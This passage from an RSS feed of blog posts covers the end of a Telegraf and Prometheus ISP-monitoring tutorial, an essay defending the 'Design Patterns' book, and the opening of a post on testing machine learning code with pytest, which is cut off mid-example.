<span>urls</span> = [<span>"mrkaran.dev"</span>, <span>"tailscale.mrkaran.dev"</span>, <span>"floyd.mrkaran.dev"</span>, <span>"1.1.1.1"</span>, <span>"kite.zerodha.com"</span>, <span>"google.com"</span>, <span>"reddit.com"</span>, <span>"twitter.com"</span>, <span>"amazon.in"</span>, <span>"zerodha.com"</span>]
<span>count</span> = <span>4</span>
<span>ping_interval</span> = <span>1.0</span>
<span>timeout</span> = <span>2.0</span>

<span># DNS plugin</span>
[[<span>inputs</span>.<span>dns_query</span>]]
  <span>servers</span> = [<span>"100.101.134.59"</span>]
  <span>domains</span> = [<span>"mrkaran.dev"</span>, <span>"tailscale.mrkaran.dev"</span>, <span>"floyd.mrkaran.dev"</span>, <span>"1.1.1.1"</span>, <span>"kite.zerodha.com"</span>, <span>"google.com"</span>, <span>"reddit.com"</span>, <span>"twitter.com"</span>, <span>"amazon.in"</span>, <span>"zerodha.com"</span>]

<span># Output format plugins</span>
[[<span>outputs</span>.<span>prometheus_client</span>]]
  <span>listen</span> = <span>":9283"</span>
  <span>metric_version</span> = <span>2</span></code></pre></div>
<p>Firstly, so nice to see an <em>Ops</em> tool <strong>not</strong> using <code>YAML</code>. Kudos to Telegraf for that. I‚Äôd love to see other tools follow suit.</p>

<p>Getting back to the configuration part, <code>input.plugin</code> is a list of plugins that can be configured and I have configured the Ping and DNS plugin in my config. The <code>output</code> is in Prometheus format so it can be scraped and ingested by Prometheus‚Äô time-series DB.</p>

<h3 id="running-telegraf">Running Telegraf</h3>

<p>With the above config in place, let‚Äôs try running the agent and see what metrics we get. I am using <a href="https://hub.docker.com/_/telegraf/">official</a> Docker image to run the agent with the following config:</p>
<div><pre><code data-lang="sh">docker run --name telegraf-agent --restart always -d -p <span>9283</span>:9283 -v <span>$PWD</span>/telegraf.conf:/etc/telegraf/telegraf.conf:ro telegraf</code></pre></div>
<p>After running the above command, you should be able to see the metrics at <code>localhost:9283/metrics</code></p>
<div><pre><code data-lang="sh">$ curl localhost:9283/metrics | head
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  <span>0</span>     <span>0</span>    <span>0</span>     <span>0</span>    <span>0</span>     <span>0</span>      <span>0</span>      <span>0</span> --:--:-- --:--:-- --:--:--     <span>0</span><span># HELP dns_query_query_time_ms Telegraf collected metric</span>
<span># TYPE dns_query_query_time_ms untyped</span>
dns_query_query_time_ms{<span>dc</span>=<span>"floyd"</span>,domain=<span>"amazon.in"</span>,host=<span>"work"</span>,rack=<span>"work"</span>,rcode=<span>"NOERROR"</span>,record_type=<span>"NS"</span>,result=<span>"success"</span>,server=<span>"100.101.134.59"</span>} <span>124</span>.096472
dns_query_query_time_ms{<span>dc</span>=<span>"floyd"</span>,domain=<span>"google.com"</span>,host=<span>"work"</span>,rack=<span>"work"</span>,rcode=<span>"NOERROR"</span>,record_type=<span>"NS"</span>,result=<span>"success"</span>,server=<span>"100.101.134.59"</span>} <span>136</span>.793673
dns_query_query_time_ms{<span>dc</span>=<span>"floyd"</span>,domain=<span>"kite.zerodha.com"</span>,host=<span>"work"</span>,rack=<span>"work"</span>,rcode=<span>"NOERROR"</span>,record_type=<span>"NS"</span>,result=<span>"success"</span>,server=<span>"100.101.134.59"</span>} <span>122</span>.780946
dns_query_query_time_ms{<span>dc</span>=<span>"floyd"</span>,domain=<span>"mrkaran.dev"</span>,host=<span>"work"</span>,rack=<span>"work"</span>,rcode=<span>"NOERROR"</span>,record_type=<span>"NS"</span>,result=<span>"success"</span>,server=<span>"100.101.134.59"</span>} <span>137</span>.915851
dns_query_query_time_ms{<span>dc</span>=<span>"floyd"</span>,domain=<span>"twitter.com"</span>,host=<span>"work"</span>,rack=<span>"work"</span>,rcode=<span>"NOERROR"</span>,record_type=<span>"NS"</span>,result=<span>"success"</span>,server=<span>"100.101.134.59"</span>} <span>111</span>.097483</code></pre></div>
<p>Perfect! Now, we‚Äôre all set to configure Prometheus to scrape the metrics from this target. In order to do that you need to add a new <a href="https://prometheus.io/docs/concepts/jobs_instances/">Job</a>:</p>
<div><pre><code data-lang="yml">- job_name: <span>"ispmonitor"</span>
  scrape_interval: 60s
  static_configs:
    - targets: [<span>"100.94.241.54:9283"</span>] <span># RPi telegraf Agent</span></code></pre></div>
<p>In the above config, I am plugging my Tailscale IP assigned to my RPi on the port where Telegraf agent is bound to. This is one of the <strong>many</strong> reasons why Tailscale is so bloody awesome! I can connect different components in my network to each other without setting up any particular firewall rules, exposing ports on a case by case basis.</p>

<p><strong>Sidenote</strong>: If you haven‚Äôt read Tailscale‚Äôs <strong>amazing</strong> <a href="https://tailscale.com/blog/how-nat-traversal-works/">NAT Traversal blog post</a>, do yourself a favour and check it out after you finish reading this one ofcourse!</p>

<p>Anyway, coming back to our Prometheus setup, we can see the metrics being ingested:</p>

<p><img src="https://mrkaran.dev/images/Prometheus-Telegraf-Ingest.png" alt="image"></p>

<h2 id="show-me-the-graphs">Show me the graphs</h2>

<p>Now comes the exciting bit ‚Äì making <strong>pretty</strong> graphs. First, let‚Äôs discuss what‚Äôs the most important data I can extract out of <code>Ping</code> and <code>DNS</code> plugins. These plugins export decent amount of data, but a good rule of thumb while making dashboards is to optimise signal v/s noise ratio. We‚Äôll do that by filtering out only the metrics that we care for.</p>

<p>Let‚Äôs checkout all the metrics exported by <code>Ping</code> plugin:</p>
<div><pre><code data-lang="sh">$ curl localhost:9283/metrics | grep ping | grep TYPE
<span># TYPE ping_average_response_ms untyped</span>
<span># TYPE ping_maximum_response_ms untyped</span>
<span># TYPE ping_minimum_response_ms untyped</span>
<span># TYPE ping_packets_received untyped</span>
<span># TYPE ping_packets_transmitted untyped</span>
<span># TYPE ping_percent_packet_loss untyped</span>
<span># TYPE ping_result_code untyped</span>
<span># TYPE ping_standard_deviation_ms untyped</span>
<span># TYPE ping_ttl untyped</span></code></pre></div>
<p>Perfect! So, from the above list of metrics, the most important ones for us are:</p>

<ul>
<li><code>ping_average_response_ms</code>: Avg RTT for a packet</li>
<li><code>ping_maximum_response_ms</code>: Max RTT for a packet</li>
<li><code>ping_percent_packet_loss</code>: % of packets lost on the way</li>
</ul>

<p>With just the above 3 metrics, we can answer questions like:</p>

<ul>
<li><strong>Is my ISP suffering an outage?</strong></li>
</ul>

<p>If yes, <code>ping_percent_packet_loss</code> should be unusually higher than normal. This usually happens when the ISP has routing is borked and that causes the packet to be routed in a less optimized way and as a side effect packet loss becomes one of the key metrics to measure here.</p>

<ul>
<li><strong>Is the upstream down?</strong></li>
</ul>

<p>If yes, <code>ping_average_response_ms</code> over a recent window should be higher than a window compared to a previous time range when things were fine and dandy. This can either mean 2 things: Either your ISP isn‚Äôt routing correctly to the said upstream or the CDN/Region where your upstream is faced an outage. This is quite a handy metric for me to monitor!</p>

<p>How many times have your friends complained ‚Äú<code>xyz.com</code> isn‚Äôt working for me‚Äù and when you try to load, it‚Äôs fine from your end? There are a lot of actors at play but <code>ping</code> is usually the most simple and quickest way to detect whether an issue persists or not. Of course, this doesn‚Äôt work for hosts which block ICMP packets altogether. They are not rare either, like <code>netflix.com</code> and <code>github.com</code> both block ICMP probes for example. For my use case, this wasn‚Äôt a major issue as I was able to still probe a decent amount of upstreams all over the world.</p>

<p>With that out of the way, let‚Äôs break the dashboard into different components and see what goes behind them.</p>

<h3 id="ping-response-panel">Ping Response Panel</h3>

<p><img src="https://mrkaran.dev/images/ping-row-panel3.png" alt=""></p>

<p>To plot this, simply choose a <code>Stat</code> visualisation with the query <code>ping_average_response_ms{url="$url"}</code>. Repeat this panel for the variable <code>$url</code> and you should be able to generate a nice row view like this.</p>

<p>Additonally you can choose Thresholds and the Unit to be displayed in the panel with these options.</p>

<p><img src="https://mrkaran.dev/images/ping-row-panel1.png" alt="">
<img src="https://mrkaran.dev/images/ping-row-panel2.png" alt=""></p>

<h3 id="ping-response-time-graph">Ping Response Time Graph</h3>

<p>The next graph is interesting, it lets me visualise the avg, min, max ping response time as well as the % packet loss plotted on the Y2 (right Y) axis.</p>

<p><img src="https://mrkaran.dev/images/floyd-ping.png" alt=""></p>

<h3 id="availability-panel">Availability Panel</h3>

<p>An interesting query to calculate uptime (just in the context whether the upstream is reachable) is:</p>
<div><pre>100 - avg_over_time(ping_percent_packet_loss[2m])</pre></div>
<p>Since I scrape metrics at an interval of <code>1m</code>(in order to not ping too frequently and disrupt my actual browsing experience), in this query I am averaging the data points for the metric <code>ping_percent_packet_loss</code> in a <code>[2m]</code> window.</p>

<p><img src="https://mrkaran.dev/images/ping-availability.png" alt=""></p>

<h3 id="dns-response-time-graph">DNS Response Time Graph</h3>

<p>We can similarly query the DNS response time by visualising the average response time for a DNS query. This might be useful only to people self-hosting their DNS servers.</p>

<p><img src="https://mrkaran.dev/images/telegraf-dns.png" alt=""></p>

<h2 id="conclusion">Conclusion</h2>

<p>So with a pretty simple and minimal OSS solution, I was able to setup monitoring for my home network! Over the last few days whenever my ISP had slightest of trouble, I can correlate it with my metrics! I mean I still can‚Äôt do anything about it cause the other person on ISP‚Äôs customer support is ‚ÄúDid you try rebooting your router‚Äù  ‚Äì the quintessential solution to all tech problems. Wish we could reboot this entire damn 2020 as well, but one could hope!</p>

<p>If you enjoyed reading this please share it in your circle! Shoot me for any questions on my Twitter <a href="https://twitter.com/mrkaran_">@mrkaran_</a> :)</p>

<p>Fin!</p>

			</div></div>]]>
            </description>
            <link>https://mrkaran.dev/posts/isp-monitoring/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24524433</guid>
            <pubDate>Sat, 19 Sep 2020 02:39:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Don't hate the book because you don't use it]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24524046">thread link</a>) | @pietromenna
<br/>
September 18, 2020 | https://aseure.fr/articles/2020-09-18-dont-hate-the-book-because-you-dont-use-it/ | <a href="https://web.archive.org/web/*/https://aseure.fr/articles/2020-09-18-dont-hate-the-book-because-you-dont-use-it/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
<h3>
  18 September 2020
</h3>


  <p>In a few months, I‚Äôll celebrate my fifth year as a professional - understand paid - software engineer. I find this role to be a right balance of technical skills, human relationships and it fulfils my curiosity. As time goes by, I‚Äôm also starting to be disappointed by some of its negative aspects. While it doesn‚Äôt prevent me from sleeping, I think an effort could be made to challenge some lousy and short-sighted comments we see daily on social platforms.</p>
<p>Today, I‚Äôd like to talk about <a href="https://www.amazon.com/Design-Patterns-Object-Oriented-Addison-Wesley-Professional-ebook/dp/B000SEIBB8">Design Patterns: Elements of Reusable Object-Oriented Software</a>, a book written by Erich Gamma, Richard Helm, Ralph Johnson, and John Vlissides, famously known as the <em>Gang of Four</em>. If you never read it: this is a fundamental programming book describing programming abstractions published in 1994. The date is essential here, but we‚Äôll come to that later.</p>
<p>This book has recently been discussed by many, due to <a href="https://twitter.com/unclebobmartin/status/1306581616983183361">a recent tweet from Robert. C. Martin aka Uncle Bob</a>. Long story short, telling a massive audience that book X is great, and treating people who consider it outdated as ‚Äúfoolish‚Äù does not end well.</p>
<p>While I disagree with the tone here, I‚Äôd like to focus on the negative comments which followed, including but not limited to:</p>
<ul>
<li>the book is outdated</li>
<li>its concepts are outdated</li>
<li>its authors said it‚Äôs outdated</li>
<li>the book is only focused on mid-90s C++ developers</li>
<li>no one ever used the ‚Äúflyweight‚Äù design pattern</li>
<li>the book is not even readable</li>
<li>its abstractions make code unreadable</li>
</ul>
<p>First of all, let‚Äôs get back to 1994. I was two at the time. All Internet websites could probably fit on a floppy disk, Jeff Bezos founded Amazon, Rasmus Lerdorf was only starting to work on its <em>Personal Home Page/Forms Interpreter</em> CGI C program, and Larry Page and Sergey Brin would only start their research project for a web search engine two years later. The biggest technology companies were IBM, Hewlett-Packard, Motorola and Xerox, which mostly sat behind the oil, car, and food industries. Programming existed, but it wasn‚Äôt the same field as we know it today. Tech companies were a few, and I assume a lot of programmers were working in other industries. Being a professional in this sector was arguably more difficult then, and knowledge was not as easily accessible as it is today. This book was published in a world where programming started to spread in many industries. It surely was a very good resource, to try to apply its concepts, and see what works and what doesn‚Äôt. The authors were literally inventing the field at the time: Erich Gamma, for instance, teamed up with Kent Beck to create the Java JUnit test framework just a few years later, which hugely helped to popularise testing.</p>
<p>My point is: let‚Äôs remind ourselves we stand on the shoulders of many people who tried and experimented a lot at the time. We too often take for granted the knowledge and productivity we have today. On top of that, let‚Äôs not be disrespectful towards the previous generation. My father and my grandfather both work(ed) as electricians: never did my father complain about his father‚Äôs tools or habits before him. He learned them and perfected them with modern knowledge.</p>
<p>Now about the book in itself. While I agree with people saying that some design patterns are too abstract, I strongly disagree with the ones saying the whole book is outdated. Should you develop in a OO language today, such as Java, C++, Python or Ruby, or even more notably, develop a framework or a tool <em>for</em> developers, I think this book is still highly relevant today.</p>
<p>Here are my top picks from the book and why I chose them.</p>
<p><strong>Builder:</strong> because in OOP, objects often hold too much data in them, you need to control how to instantiate them properly. Even with overloaded constructors, data validation at instantiation can become messy. Do you like your testing framework using a <em>fluent interface</em> with method chaining (<code>assert(...).not().equalTo(...)</code>)? Guess what, it‚Äôs directly inspired by the builder design pattern.</p>
<p><strong>Prototype:</strong> I often hear people complaining about how complicated JavaScript is. While I don‚Äôt think this language makes it easy for the developer to write non error-prone code, I better understood the language via the lens of its prototype-based nature, precisely described by the prototype design pattern.</p>
<p><strong>Most of the structural patterns:</strong> While everyone is focused on the bad parts of OOP, namely inheritance, all those design patterns are focused on composability. If you want to be cool nowadays, you could say you prefer ‚Äúcomposition over inheritance‚Äù. Well, if you think composition is only about embedding objects in each other, you should read the part of structural design patterns. For instance, you probably know decorators from Python or annotations in Java/C#, they derive from the decorator design pattern.</p>
<p><strong>Chain of Responsibility:</strong> I think we can all agree on how great it is to use and implement a middleware in our modern web framework. Just use or write functions which take a <em>next</em> handler, a request object. Pass it to your web framework instance via a <code>.use(...)</code> method and you‚Äôre done. This is what the Chain of Responsibility pattern is all about. All Rails, Django, and Laravel developers knew that was NIH.</p>
<p><strong>Iterator:</strong> This one seems obvious now, perhaps not so much at a time where iterating on arrays with pointer arithmetic was common. Today, iterators are even buried behind standard libraries to implement even higher abstract functionalities, but they are still there. I don‚Äôt see a more universal way to implement, with the same public API, a traversal of an array, a tree, or a graph (they are better ways of iterating those last data structures though).</p>
<p><strong>Observer:</strong> For this last one, here is the verbatim definition from the book: ‚ÄúDefine a one-to-many dependency between objects so that when one object changes state, all its dependents are notified and updated automatically‚Äù. Now, if we take a look at some modern technologies, doesn‚Äôt this resonate with PubSub models or React hooks for instance?</p>
<p>To conclude, I‚Äôm not saying the book is not old, quite the opposite: you can feel it when it takes as examples from 90s user interfaces. I‚Äôm merely advocating that our industry and its workers have changed a lot in the last 30 years, dare I say even more than in any other industry. But this should not be an excuse to sweep away years of meticulous R&amp;D and documentation, on which our modern tools still rely on nowadays, and the people behind it.</p>
<p>Because a lot of people complained that they were never able to finish the book, here is an extract from the end, section ‚ÄúWhat to Expect from Design Patterns‚Äù, page 351:</p>
<blockquote>
<p>It‚Äôs possible to argue that this book hasn‚Äôt accomplished much. After all, it doesn‚Äôt present any algorithms or programming techniques that haven‚Äôt been used before. [‚Ä¶] it just documents existing designs. You could conclude that it makes a reasonable tutorial, perhaps, but it certainly can‚Äôt offer much to an experienced object-oriented designer.</p>
<p>We hope you think differently. Cataloging design patterns is important. It gives us standard names and definitions for the techniques we use. If we don‚Äôt study design patterns in software, we won‚Äôt be able to improve them, and it‚Äôll be harder to come up with new ones.</p>
<p>This book is only a start.</p>
</blockquote>

</div></div>]]>
            </description>
            <link>https://aseure.fr/articles/2020-09-18-dont-hate-the-book-because-you-dont-use-it/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24524046</guid>
            <pubDate>Sat, 19 Sep 2020 01:38:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Test Machine Learning Code and Systems]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24523930">thread link</a>) | @7d7n
<br/>
September 18, 2020 | https://eugeneyan.com/writing/testing-ml/ | <a href="https://web.archive.org/web/*/https://eugeneyan.com/writing/testing-ml/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>Two weeks ago, <a href="https://twitter.com/jeremyjordan" target="_blank">Jeremy</a> wrote a great post on <a href="https://www.jeremyjordan.me/testing-ml/" target="_blank">Effective Testing for Machine Learning Systems</a>. He distinguished between traditional software tests and machine learning (ML) tests; software tests check the <strong>written logic</strong> while ML tests check the <strong>learned logic</strong>.</p>

<p>ML tests can be further split into <strong>testing</strong> and <strong>evaluation</strong>. We‚Äôre familiar with ML <strong>evaluation</strong> where we train a model and evaluate its performance on an unseen validation set; this is done via metrics (e.g., accuracy, <a href="https://en.wikipedia.org/wiki/Receiver_operating_characteristic#Area_under_the_curve" target="_blank">Area under Curve of Receiver Operating Characteristic (AUC ROC)</a>) and visuals (e.g., <a href="https://eugeneyan.com/writing/recommender-systems-baseline-pytorch/#implementation-2-matrix-factorization-with-bias" target="_blank">precision-recall curve</a>).</p>

<p>On the other hand, ML <strong>testing</strong> involves checks on model behaviour. <strong>Pre-train tests</strong>‚Äîwhich can be run without trained parameters‚Äîcheck if our <em>written logic</em> is correct. For example, is classification probability between 0 to 1? <strong>Post-train tests</strong> check if the <em>learned logic</em> is expected. For example, on the <a href="https://www.kaggle.com/c/titanic/data" target="_blank">Titanic dataset</a>, we should expect females to have a higher survival probability (relative to males).</p>

<p><img src="https://eugeneyan.com/assets/testing-ml-flow.jpg" title="Workflow for testing machine learning" alt="Workflow for testing machine learning"></p>
<p>Workflow for testing machine learning (<a href="https://www.jeremyjordan.me/testing-ml/" target="_blank">source</a>)</p>

<p>Taken together, here‚Äôs how the workflow might look like. To complement this, we‚Äôll implement a machine learning model and run the following tests on it:</p>
<ul>
  <li><a href="#pre-train-tests-to-ensure-correct-implementation">Pre-train tests to ensure correct implementation</a></li>
  <li><a href="#post-train-tests-to-ensure-expected-learned-behaviour">Post-train tests to ensure expected learned behaviour</a></li>
  <li><a href="#model-evaluation-to-ensure-satisfactory-performance">Evaluation to ensure satisfactory model performance</a></li>
</ul>

<blockquote>
  <p>Follow along with the code in this Github repository: <a href="https://github.com/eugeneyan/testing-ml" target="_blank"><code>testing-ml</code></a></p>
</blockquote>

<h2 id="setting-up-the-context-algorithm-and-data">Setting up the context (algorithm and data)</h2>

<p>Before we can do ML testing, we‚Äôll need an <strong>algorithm and some data</strong>. Our algorithm will be a <a href="https://numpy.org/" target="_blank"><code>numpy</code></a> implementation of <a href="https://github.com/eugeneyan/testing-ml/blob/master/src/tree/decision_tree.py" target="_blank"><code>DecisionTree</code></a> which predicts a probability for binary classification. (<a href="#try-it-for-yourself-and-break-something">Extensions to make it support regression welcome!</a>).</p>

<p>To run our tests, we‚Äôll use the <a href="https://www.kaggle.com/c/titanic/data" target="_blank">Titanic dataset</a>. This tiny data set (~900 rows, 10 features) makes for fast testing (when model training is involved) and allows us to iterate quickly. (As part of performance evaluation, we run <code>fit()</code> and <code>predict()</code> hundreds of times to get the 99th percentile timing.) The simplicity and familiarity of the data also makes it easier to discuss the post-train (i.e., learned logic) tests.</p>

<div><div><pre><code>+ ------------+----------+--------+-----------------------------------------+--------+-----+-------+-------+-----------+---------+-------+----------+
| PassengerId | Survived | Pclass | Name                                    | Sex    | Age | SibSp | Parch | Ticket    |    Fare | Cabin | Embarked |
+ ------------+----------+--------+-----------------------------------------+--------+-----+-------+-------+-----------+---------+-------+----------|
|           1 |        0 |      3 | Braund, Mr. Owen Harris                 | male   |  22 |     1 |     0 | A/5 21171 |    7.25 | nan   | S        |
|           2 |        1 |      1 | Cumings, Mrs. John Bradley (Florence... | female |  38 |     1 |     0 | PC 17599  | 71.2833 | C85   | C        |
|           3 |        1 |      3 | Heikkinen, Miss. Laina                  | female |  26 |     0 |     0 | STON/O2.  |   7.925 | nan   | S        |
|           4 |        1 |      1 | Futrelle, Mrs. Jacques Heath (Lily M... | female |  35 |     1 |     0 | 113803    |    53.1 | C123  | S        |
|           5 |        0 |      3 | Allen, Mr. William Henry                | male   |  35 |     0 |     0 | 373450    |    8.05 | nan   | S        |
|           6 |        0 |      3 | Moran, Mr. James                        | male   | nan |     0 |     0 | 330877    |  8.4583 | nan   | Q        |
|           7 |        0 |      1 | McCarthy, Mr. Timothy J                 | male   |  54 |     0 |     0 | 17463     | 51.8625 | E46   | S        |
|           8 |        0 |      3 | Palsson, Master. Gosta Leonard          | male   |   2 |     3 |     1 | 349909    |  21.075 | nan   | S        |
|           9 |        1 |      3 | Johnson, Mrs. Oscar W (Elisabeth Vil... | female |  27 |     0 |     2 | 347742    | 11.1333 | nan   | S        |
|          10 |        1 |      2 | Nasser, Mrs. Nicholas (Adele Achem)     | female |  14 |     1 |     0 | 237736    | 30.0708 | nan   | C        |
+ ------------+----------+--------+-----------------------------------------+--------+-----+-------+-------+-----------+---------+-------+----------+
</code></pre></div></div>
<p>If you're unfamiliar with the Titanic dataset, here's how it looks like (scroll to the right).</p>

<h2 id="adopting-testing-habits-from-software-engineering">Adopting testing habits from software engineering</h2>

<p>We‚Äôll adopt some good habits from software engineering. We won‚Äôt go through them in detail here though it was previously covered in another <a href="https://eugeneyan.com/writing/setting-up-python-project-for-automation-and-collaboration/" target="_blank">post</a>:</p>
<ul>
  <li><a href="https://eugeneyan.com/writing/setting-up-python-project-for-automation-and-collaboration/#write-some-unit-tests-theyre-our-safety-harness" target="_blank">Unit test</a> fixture reuse, exceptions testing, etc with <a href="https://docs.pytest.org/en/latest/" target="_blank"><code>pytest</code></a></li>
  <li><a href="https://eugeneyan.com/writing/setting-up-python-project-for-automation-and-collaboration/#check-for-coverage-how-extensive-are-our-tests" target="_blank">Code coverage</a> with <a href="https://coverage.readthedocs.io/en/coverage-5.2.1/" target="_blank"><code>Coverage.py</code></a> and <a href="https://pytest-cov.readthedocs.io/en/latest/" target="_blank"><code>pytest-cov</code></a></li>
  <li><a href="https://eugeneyan.com/writing/setting-up-python-project-for-automation-and-collaboration/#lint-to-ensure-consistency-across-projects" target="_blank">Linting</a> to ensure code consistency with <a href="https://www.pylint.org/" target="_blank"><code>pylint</code></a></li>
  <li><a href="https://eugeneyan.com/writing/setting-up-python-project-for-automation-and-collaboration/#check-for-type-errors-to-prevent-them" target="_blank">Type checking</a> to verify type correctness with <a href="http://mypy-lang.org/" target="_blank"><code>mypy</code></a></li>
</ul>

<p>(Note: The tests below won‚Äôt include type hints though the <a href="https://github.com/eugeneyan/testing-ml/blob/master/src/tree/decision_tree.py#L16" target="_blank">implementation code</a> does.)</p>

<h2 id="pre-train-tests-to-ensure-correct-implementation">Pre-train tests to ensure correct implementation</h2>

<p>In pre-train tests, we want to <strong>catch errors in our implementation</strong> (i.e., written logic) before training an erroneous model. We can run these tests without a fully trained model.</p>

<p>First, we‚Äôll test our functions of <a href="https://en.wikipedia.org/wiki/Decision_tree_learning#Gini_impurity" target="_blank">Gini impurity</a> and <a href="https://en.wikipedia.org/wiki/Decision_tree_learning#Information_gain" target="_blank">Gini gain</a>. These will be used to <a href="https://en.wikipedia.org/wiki/Decision_tree_learning#General" target="_blank">split the data</a> and grow our decision tree.</p>

<div><div><pre><code><span>def</span> <span>test_gini_impurity</span><span>():</span>
    <span>assert</span> <span>round</span><span>(</span><span>gini_impurity</span><span>([</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>]),</span> <span>3</span><span>)</span> <span>==</span> <span>0</span>
    <span>assert</span> <span>round</span><span>(</span><span>gini_impurity</span><span>([</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>]),</span> <span>3</span><span>)</span> <span>==</span> <span>0.219</span>
    <span>assert</span> <span>round</span><span>(</span><span>gini_impurity</span><span>([</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>]),</span> <span>3</span><span>)</span> <span>==</span> <span>0.375</span>
    <span>assert</span> <span>round</span><span>(</span><span>gini_impurity</span><span>([</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>]),</span> <span>3</span><span>)</span> <span>==</span> <span>0.469</span>
    <span>assert</span> <span>round</span><span>(</span><span>gini_impurity</span><span>([</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>]),</span> <span>3</span><span>)</span> <span>==</span> <span>0.500</span>


<span>def</span> <span>test_gini_gain</span><span>():</span>
    <span>assert</span> <span>round</span><span>(</span><span>gini_gain</span><span>([</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>],</span> <span>[[</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>],</span> <span>[</span><span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>]]),</span> <span>3</span><span>)</span> <span>==</span> <span>0.5</span>
    <span>assert</span> <span>round</span><span>(</span><span>gini_gain</span><span>([</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>],</span> <span>[[</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>],</span> <span>[</span><span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>1</span><span>]]),</span> <span>3</span><span>)</span> <span>==</span> <span>0.125</span>
    <span>assert</span> <span>round</span><span>(</span><span>gini_gain</span><span>([</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>],</span> <span>[[</span><span>1</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>],</span> <span>[</span><span>0</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>]]),</span> <span>3</span><span>)</span> <span>==</span> <span>0.125</span>
    <span>assert</span> <span>round</span><span>(</span><span>gini_gain</span><span>([</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>],</span> <span>[[</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>],</span> <span>[</span><span>0</span><span>,</span> <span>0</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>]]),</span> <span>3</span><span>)</span> <span>==</span> <span>0.0</span>
</code></pre></div></div>

<p>Next, we‚Äôll check if the model prediction shape is expected. We should have the same number of rows as the input features.</p>

<div><div><pre><code><span>def</span> <span>test_dt_output_shape</span><span>(</span><span>dummy_titanic</span><span>):</span>
    <span>X_train</span><span>,</span> <span>y_train</span><span>,</span> <span>X_test</span><span>,</span> <span>y_test</span> <span>=</span> <span>dummy_titanic</span>
    <span>dt</span> <span>=</span> <span>DecisionTree</span><span>()</span>
    <span>dt</span><span>.</span><span>fit</span><span>(</span><span>X_train</span><span>,</span> <span>y_train</span><span>)</span>
    <span>pred_train</span> <span>=</span> <span>dt</span><span>.</span><span>predict</span><span>(</span><span>X_train</span><span>)</span>
    <span>pred_test</span> <span>=</span> <span>dt</span><span>.</span><span>predict</span><span>(</span><span>X_test</span><span>)</span>

    <span>assert</span> <span>pred_train</span><span>.</span><span>shape</span> <span>==</span> <span>(</span><span>X_train</span><span>.</span><span>shape</span><span>[</span><span>0</span><span>],),</span> <span>'DecisionTree output should be same as training labels.'</span>
    <span>assert</span> <span>pred_test</span><span>.</span><span>shape</span> <span>==</span> <span>(</span><span>X_test</span><span>.</span><span>shape</span><span>[</span><span>0</span><span>],),</span> <span>'DecisionTree output should be same as testing labels.'</span>
</code></pre></div></div>

<p>We‚Äôll also want to check the output ranges. Given that we‚Äôre predicting probabilities, we should expect the output to range from 0 to 1 inclusive.</p>

<div><div><pre><code><span>def</span> <span>test_dt_output_range</span><span>(</span><span>dummy_titanic</span><span>):</span>
    <span>X_train</span><span>,</span> <span>y_train</span><span>,</span> <span>X_test</span><span>,</span> <span>y_test</span> <span>=</span> <span>dummy_titanic</span>
    <span>dt</span> <span>=</span> <span>DecisionTree</span><span>()</span>
    <span>dt</span><span>.</span><span>fit</span><span>(</span><span>X_train</span><span>,</span> <span>y_train</span><span>)</span>
    <span>pred_train</span> <span>=</span> <span>dt</span><span>.</span><span>predict</span><span>(</span><span>X_train</span><span>)</span>
    <span>pred_test</span> <span>=</span> <span>dt</span><span>.</span><span>predict</span><span>(</span><span>X_test</span><span>)</span>

